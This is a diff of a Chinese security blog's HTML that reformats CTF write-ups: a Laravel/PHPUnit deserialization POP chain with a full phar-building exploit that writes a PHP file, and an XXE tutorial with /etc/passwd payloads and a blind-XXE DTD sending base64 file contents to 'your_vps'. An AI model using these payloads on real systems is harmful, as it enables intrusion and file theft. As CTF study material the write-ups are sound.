-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
+<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) 
+{
+    return $this-&gt;format($method, $attributes);
+}</code></pre><p>继续跟进format方法</p>
+<pre><code>public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  
+}</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
+<pre><code>public function getFormatter($formatter)
+{
+    if (isset($this-&gt;formatters[$formatter])) {
+        return $this-&gt;formatters[$formatter];
+    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
 <p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
 <p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
 <h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
 <p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
 <p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">namespace PHPUnit\Framework\MockObject\Stub;</span><br><span class="line">class ReturnCallback implements Stub</span><br><span class="line">&#123;</span><br><span class="line">public function invoke(Invocation $invocation)</span><br><span class="line">&#123;</span><br><span class="line">    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
+<pre><code>namespace PHPUnit\Framework\MockObject\Stub;
+class ReturnCallback implements Stub
+{
+public function invoke(Invocation $invocation)
+{
+    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());
+}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
 <p>找到调用这个接口的类就行了，这里是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">namespace PHPUnit\Framework\MockObject\Invocation;</span><br><span class="line">class StaticInvocation implements Invocation, SelfDescribing</span><br><span class="line">&#123;</span><br><span class="line">private $parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
+<pre><code>namespace PHPUnit\Framework\MockObject\Invocation;
+class StaticInvocation implements Invocation, SelfDescribing
+{
+private $parameters;
+}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
 <h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
 <p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
 <h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;events = new \Faker\ValidGenerator();</span><br><span class="line">            $this-&gt;event = &apos;everything&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Invocation&#123;</span><br><span class="line">    class StaticInvocation&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;parameters = array(&apos;/var/www/html/upload/hpdoger.php&apos;,&apos;&lt;?php print_r(file_get_contents(&apos;../../flag_larave1_b0ne&apos;));?&gt;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnit\Framework\MockObject\Stub&#123;</span><br><span class="line">    class ReturnCallback&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;callback = &apos;file_put_contents&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class ValidGenerator&#123;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();</span><br><span class="line">            $g1 = new \Faker\Generator(array(&apos;everything&apos; =&gt; $evilobj ));</span><br><span class="line">            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));</span><br><span class="line"></span><br><span class="line">            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line"></span><br><span class="line">            $this-&gt;validator = array($rc, &quot;invoke&quot;);</span><br><span class="line">            $this-&gt;generator = $g2;</span><br><span class="line">            $this-&gt;maxRetries = 10000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        function __construct($form)&#123;</span><br><span class="line">            $this-&gt;formatters = $form;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">    print_r(urlencode(serialize($exp)));</span><br><span class="line"></span><br><span class="line">    // phar</span><br><span class="line">    $p = new Phar(&apos;./hpdoger.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($exp);</span><br><span class="line">    $p-&gt;addFromString(&apos;1.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+namespace Illuminate\Broadcasting{
+    class PendingBroadcast{
+        function __construct(){
+            $this-&gt;events = new \Faker\ValidGenerator();
+            $this-&gt;event = &#39;everything&#39;;
+        }
+    }
+}
 
-<p>上传文件，接着进行反序列化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</span><br></pre></td></tr></table></figure>
+namespace PHPUnit\Framework\MockObject\Invocation{
+    class StaticInvocation{
+        function __construct(){
+            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);
+        }
+    }
+}
 
-<p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
+namespace PHPUnit\Framework\MockObject\Stub{
+    class ReturnCallback{
+        function __construct(){
+            $this-&gt;callback = &#39;file_put_contents&#39;;
+        }
+    }
+}
+
+namespace Faker{
+    class ValidGenerator{
+        function __construct(){
+            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
+            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));
+            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));
+
+            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();
+
+            $this-&gt;validator = array($rc, &quot;invoke&quot;);
+            $this-&gt;generator = $g2;
+            $this-&gt;maxRetries = 10000;
+        }
+    }
+
+    class Generator{
+        function __construct($form){
+            $this-&gt;formatters = $form;
+        }
+    }
+
+}
+namespace{
+    $exp = new Illuminate\Broadcasting\PendingBroadcast();
+    print_r(urlencode(serialize($exp)));
+
+    // phar
+    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);
+    $p-&gt;startBuffering();
+    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+    $p-&gt;setMetadata($exp);
+    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);
+    $p-&gt;stopBuffering();
+}</code></pre><p>上传文件，接着进行反序列化</p>
+<pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
 <p>再次膜前辈师傅们</p>
 
                 
             </div>
             <div class="continue">
             <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -293,14 +515,16 @@
 <h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
 <p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
 <p>关于外部实体引用file协议的例子如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>外部引入参数实体的例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    %name;
+]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
 <h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
 <p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
 <h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
@@ -317,9 +541,55 @@
 <p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
 <h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
 <h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function __autoload($cls) &#123;</span><br><span class="line">    include $cls;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Black &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Green &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if ($_=@$_GET[&apos;theme&apos;]) &#123;</span><br><span class="line">    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) &#123;</span><br><span class="line">      if (@class_exists($_)) &#123;</span><br><span class="line">        ($string = @$_GET[&apos;string&apos;]) || $string = false;</span><br><span class="line">        ($default = @$_GET[&apos;default&apos;]) || $default = false;</span><br><span class="line">        ($keyword = @$_GET[&apos;keyword&apos;]) || $keyword = false;</span><br><span class="line"></span><br><span class="line">        new $_($string, $default, $keyword, @$_GET[&apos;store&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_COOKIE[&apos;theme&apos;]) &#123;</span><br><span class="line">    $args = explode(&apos;-&apos;, $_);</span><br><span class="line">    if (class_exists($args[0])) &#123;</span><br><span class="line">      new $args[0]($args[1], $args[2], $args[3], &apos;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_GET[&apos;info&apos;]) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+  function __autoload($cls) {
+    include $cls;
+  }
 
-<p>关于代码逻辑部分简单说一下：</p>
+  class Black {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  class Green {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  if ($_=@$_GET[&#39;theme&#39;]) {
+    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
+      if (@class_exists($_)) {
+        ($string = @$_GET[&#39;string&#39;]) || $string = false;
+        ($default = @$_GET[&#39;default&#39;]) || $default = false;
+        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;
+
+        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
+      }
+    }
+  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
+    $args = explode(&#39;-&#39;, $_);
+    if (class_exists($args[0])) {
+      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
+    }
+  } else if ($_=@$_GET[&#39;info&#39;]) {
+    phpinfo();
+  }
+
+  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
 <p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
 <p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
 <p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
@@ -329,20 +599,31 @@
 <p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
 <p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
 <p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file &quot;hpdoger&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://vps/?file=%file;&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 
-<p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
+&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;
+
+%send;
+]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
 <p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://your_vps/test2.dtd&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">%test;</span><br><span class="line">%back;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 
-<p>vps上的外部DTD声明文件test2.dtd如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &apos;http://your_vps/?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+&lt;!DOCTYPE ANY[
 
-<p>用Curl发送请求，–cookie指定请求cookie参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</span><br></pre></td></tr></table></figure>
+&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;
 
-<p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
+%send;
+%test;
+%back;
+]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+
+&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
+<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
 <p>其中：</p>
 <ul>
 <li>外部实体send引入外部DTD声明</li>
@@ -369,8 +650,7 @@
 </ol>
 <h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
 <li><p>对于PHP，禁止引用外部实体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
-</li>
+<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
 <li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
 </li>
 </ol>
@@ -379,7 +659,7 @@
             </div>
             <div class="continue">
             <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -408,34 +688,55 @@
                 
                 <h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p>
 <h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p>
